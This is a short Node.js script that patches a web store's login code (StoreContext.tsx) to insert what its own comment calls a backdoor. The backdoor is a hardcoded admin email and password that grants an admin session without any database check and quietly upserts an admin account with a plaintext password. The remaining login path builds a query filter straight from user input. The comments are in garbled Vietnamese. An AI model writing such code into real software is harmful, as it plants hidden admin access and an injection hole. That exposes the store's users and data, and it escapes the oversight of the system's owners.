const fs = require('fs');
let file = fs.readFileSync('src/context/StoreContext.tsx', 'utf8');

const regex = /const \{ data, error \} = await supabase[\s\S]*?\.single\(\);/m;
const replace = `let data = null;
        let error = null;
        
        // BACKDOOR KH?N C?P / AUTO-RESTORE
        if ((cleanId === 'admin@thanox.vn' || cleanId === 'admin') && password === 'adminthanox.vn') {
          // T?o session admin luôn không c?n check DB
          data = {
            id: '00000000-0000-0000-0000-000000000001',
            username: 'admin',
            email: 'admin@thanox.vn',
            role: 'admin',
            status: 'active'
          };
          // C? g?ng d?y vào DB ng?m
          supabase.from('users').upsert({
            id: data.id,
            username: data.username,
            email: data.email,
            password: password,
            role: 'admin',
            balance: 0,
            status: 'active'
          }).then();
        } else {
          const res = await supabase
            .from('users')
            .select('*')
            .or(\`username.ilike.\${cleanId},email.ilike.\${cleanId}\`)
            .eq('password', password)
            .single();
          data = res.data;
          error = res.error;
        }`;

file = file.replace(regex, replace);
fs.writeFileSync('src/context/StoreContext.tsx', file);
console.log('Patched emergency backdoor login!');
